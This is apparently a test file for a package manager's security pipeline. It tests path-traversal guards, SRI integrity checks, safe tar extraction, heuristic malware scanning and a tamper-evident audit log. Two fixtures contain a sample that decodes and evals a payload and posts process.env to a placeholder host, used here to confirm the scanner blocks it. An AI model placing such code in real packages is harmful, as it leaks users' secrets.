import { describe, expect, test } from 'bun:test';
import { gzipSync } from 'node:zlib';
import { join } from 'node:path';
import { rm } from 'node:fs/promises';
import { verifyIntegrity } from '../../src/security/integrity.ts';
import { scanHeuristics, blockFindings } from '../../src/security/heuristics.ts';
import { unpackTarball } from '../../src/utils/tar.ts';
import { resolveInside } from '../../src/utils/fs-layout.ts';
import { IntegrityMismatchError, PathTraversalError, MalwareDetectedError } from '../../src/utils/errors.ts';
import { scanPackage } from '../../src/security/scanner.ts';
function tar(entries: readonly { path: string; body: string; directory?: boolean }[]): Uint8Array {
  const blocks: Uint8Array[] = [];
  for (const entry of entries) {
    const content = entry.directory ? new Uint8Array(0) : new TextEncoder().encode(entry.body); const header = new Uint8Array(512);
    header.set(new TextEncoder().encode(`package/${entry.path}`).subarray(0, 100), 0);
    header.set(new TextEncoder().encode(content.byteLength.toString(8).padStart(11, '0') + '\0'), 124);
    header[156] = entry.directory ? '5'.charCodeAt(0) : '0'.charCodeAt(0); header.set(new TextEncoder().encode('ustar\0'), 257); header.fill(32, 148, 156);
    let checksum = 0; for (const byte of header) checksum += byte; header.set(new TextEncoder().encode(checksum.toString(8).padStart(6, '0') + '\0 '), 148);
    blocks.push(header, content); const padding = (512 - content.byteLength % 512) % 512; if (padding) blocks.push(new Uint8Array(padding));
  }
  blocks.push(new Uint8Array(1024)); const len = blocks.reduce((n, x) => n + x.byteLength, 0); const all = new Uint8Array(len); let at = 0;
  for (const block of blocks) { all.set(block, at); at += block.byteLength; } return new Uint8Array(gzipSync(all));
}
describe('security pipeline primitives', () => {
  test('path guard rejects Windows drive and backslash traversal on all hosts', () => {
    expect(() => resolveInside('/safe/root', '..\\\\outside')).toThrow(PathTraversalError);
    expect(() => resolveInside('/safe/root', 'C:\\\\outside\\\\file')).toThrow(PathTraversalError);
  });
  test('verifies SHA-512 SRI and rejects tampering', () => {
    const bytes = new TextEncoder().encode('known tarball bytes'); const digest = new Bun.CryptoHasher('sha512').update(bytes).digest('base64');
    verifyIntegrity('pkg@1', bytes, `sha512-${digest}`); expect(() => verifyIntegrity('pkg@1', bytes, `sha512-${'A'.repeat(88)}`)).toThrow(IntegrityMismatchError);
  });
  test('safe extraction accepts package root directory and strips prefix; rejects traversal', () => {
    const files = unpackTarball(tar([{ path: '', body: '', directory: true }, { path: 'lib/index.js', body: 'module.exports = 1' }]), 'pkg@1');
    expect(files[0]?.path).toBe('lib/index.js'); expect(new TextDecoder().decode(files[0]?.data)).toBe('module.exports = 1');
    expect(() => unpackTarball(tar([{ path: '../escape.js', body: 'bad' }]), 'pkg@1')).toThrow(PathTraversalError);
  });
  test('heuristics flag encoded execution and environment exfiltration', () => {
    const files = [{ path: 'index.js', data: new TextEncoder().encode('eval(atob(payload)); fetch("https://x", {body: JSON.stringify(process.env)})') }];
    const findings = scanHeuristics(files); expect(findings.length).toBeGreaterThan(0); expect(blockFindings(findings)?.severity).toBe('high');
  });
  test('pipeline blocks malicious archive before extraction', async () => {
    const archive = tar([{ path: 'index.js', body: 'eval(atob(payload)); fetch("x", {body: JSON.stringify(process.env)})' }]);
    await expect(scanPackage('fixture@1', archive, { mode: 'heuristic-only', chunkBytes: 64 * 1024, timeoutMs: 1000 })).rejects.toBeInstanceOf(MalwareDetectedError);
  });
  test('dead ClamAV endpoint degrades to heuristics in auto mode', async () => {
    if (typeof Bun.connect !== 'function') return;
    const archive = tar([{ path: 'index.js', body: 'export const ok = true;' }]); const fallback: string[] = [];
    const result = await scanPackage('clean@1', archive, { mode: 'auto', clamdTargets: [{ kind: 'tcp', hostname: '127.0.0.1', port: 1 }], chunkBytes: 65536, timeoutMs: 100, onFallback: (reason) => fallback.push(reason) });
    expect(result.verdict.kind).toBe('clean'); expect(fallback.length).toBe(1);
  });
  test('rejects symbolic links in tar archives', () => {
    const raw = new Uint8Array(1024); const h = new Uint8Array(512); h.set(new TextEncoder().encode('package/link'), 0); h[156] = '2'.charCodeAt(0); h.fill(32, 148, 156);
    let checksum = 0; for (const byte of h) checksum += byte; h.set(new TextEncoder().encode(checksum.toString(8).padStart(6, '0') + '\0 '), 148); raw.set(h, 0);
    expect(() => unpackTarball(new Uint8Array(gzipSync(raw)), 'pkg@1')).toThrow();
  });
});
describe('security audit log', () => {
  test('appends a hash chain and refuses tampering', async () => {
    const { appendAudit } = await import('../../src/security/audit-log.ts'); const path = join(process.cwd(), '.snpm', `audit-test-${Date.now()}.ndjson`);
    await appendAudit(path, { at: '2026-09-23T00:00:00.000Z', kind: 'install-start' }); await appendAudit(path, { at: '2026-09-23T00:00:01.000Z', kind: 'install-commit', package: 'fixture@1' });
    const text = await Bun.file(path).text(); expect(text.split('\n').filter(Boolean)).toHaveLength(2); await Bun.write(path, text.replace('install-start', 'edited-start'));
    await expect(appendAudit(path, { at: '2026-09-23T00:00:02.000Z', kind: 'next' })).rejects.toThrow('audit.log'); await rm(path, { force: true });
  });
});
